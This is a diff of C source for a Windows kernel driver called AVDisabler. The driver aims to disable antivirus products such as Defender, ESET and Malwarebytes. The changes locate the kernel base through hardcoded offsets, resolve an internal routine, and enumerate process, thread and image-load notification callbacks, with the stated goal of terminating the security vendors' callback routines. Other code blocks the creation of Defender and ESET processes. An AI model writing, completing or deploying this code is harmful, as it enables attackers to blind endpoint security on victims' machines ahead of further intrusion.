@@ -2,6 +2,7 @@
 //#include "CallbackRegistrations.h"
 #include <Stdio.h>
 
+
 #define DeviceType 0x8001
 #define PROCESS_TERMINATE 1
 
@@ -11,6 +12,10 @@
 
 //TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
 //	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...
+
+ULONG_PTR PspCreateProcessCallbackRoutine = 0;
+ULONG_PTR PspCreateThreadCallbackRoutine = 0;
+ULONG_PTR PspLoadImageCallbackRoutine = 0;
 
 typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
 	PVOID Object,
@@ -129,8 +134,8 @@ void PreventDefenderProcessCreate(PEPROCESS Process,
 }
 
 NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
-				     ULONG_PTR* PspCreateThreadNotifyRoutine,
-				     ULONG_PTR* PspLoadImageNotifyRoutine)
+									 ULONG_PTR* PspCreateThreadNotifyRoutine,
+									 ULONG_PTR* PspLoadImageNotifyRoutine)
 {
 	/*
 		----Needs to be tested!!!---
@@ -142,15 +147,24 @@ NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
 		ULONG_PTR* TargetRoutineBaseAddress);
 	
 	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
-	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)MmGetSystemRoutineAddress(&PspEnumerateCallbackName);
-	if(PspEnumerateCallback)
+	//pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)MmGetSystemRoutineAddress(&PspEnumerateCallbackName);
+	UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");
+	ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
+	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));
+
+	PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
+	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));
+
+	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
+	if(!PspEnumerateCallback)
 	{
 		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: Couldn't resolve PspEnumerateCallback address\n"));
 		return STATUS_INVALID_ADDRESS;
 	}
 	KdPrint(("[*] AVDisabler::TerminateAVCallbackRoutines: PspEnumerateCallback address at: 0x%p\n", PspEnumerateCallback));
-
-	DWORD32 CallbackIndex = 1; // Process type
+	
+	DWORD32 CallbackIndex = 0;
+	//DWORD32 CallbackIndex = 1; // Process type
 	PspEnumerateCallback(1, &CallbackIndex, PspCreateProcessNotifyRoutine);
 	if(!(*PspCreateProcessNotifyRoutine))
 	{
@@ -159,8 +173,9 @@ NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
 	}
 	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateProcessNotifyRoutine: 0x%p\n", *PspCreateProcessNotifyRoutine));
 	
-	CallbackIndex = 0; // Thread type
-	PspEnumerateCallback(1, &CallbackIndex, PspCreateThreadNotifyRoutine);
+	//CallbackIndex = 0; // Thread type
+	CallbackIndex = 0;
+	PspEnumerateCallback(0, &CallbackIndex, PspCreateThreadNotifyRoutine);
 	if (!(*PspCreateThreadNotifyRoutine))
 	{
 		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspCreateThreadNotifyRoutine address is 0x0,\neither there is no thread creation callback routines or there is a bug\n"));
@@ -168,15 +183,16 @@ NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
 	}
 	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspCreateThreadNotifyRoutine: 0x%p\n", *PspCreateThreadNotifyRoutine));
 	
-	CallbackIndex = 2; // Image type
-	PspEnumerateCallback(1, &CallbackIndex, PspLoadImageNotifyRoutine);
+	//CallbackIndex = 2; // Image type
+	CallbackIndex = 0;
+	PspEnumerateCallback(2, &CallbackIndex, PspLoadImageNotifyRoutine);
 	if (!(*PspLoadImageNotifyRoutine))
 	{
 		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: PspLoadImageNotifyRoutine address is 0x0,\neither there is no load image callback routines or there is a bug\n"));
 		return STATUS_INVALID_ADDRESS;
 	}
 	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: Base Address of PspLoadImageNotifyRoutine: 0x%p\n", *PspLoadImageNotifyRoutine));
-
+	return STATUS_SUCCESS;
 }
 
 void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
@@ -323,6 +339,7 @@ NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 				memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
 				return CompleteRequest(status, Irp, sizeof(OutputBuffer));
 			}
+
 			g_IsDefenderCallbackRoutineSet = TRUE;
 			KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
 		}
@@ -452,10 +469,14 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 
 	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));
 
+	status = TerminateAVCallbackRoutines(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine); // currently here for testing purposes
+
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
 	DriverObject->DriverUnload = UnloadRoutine;
-	
+
+	KdPrint(("AVDisabler::DriverEntry: Initialization completed successfully!\n"));
+
 	return status;
 }
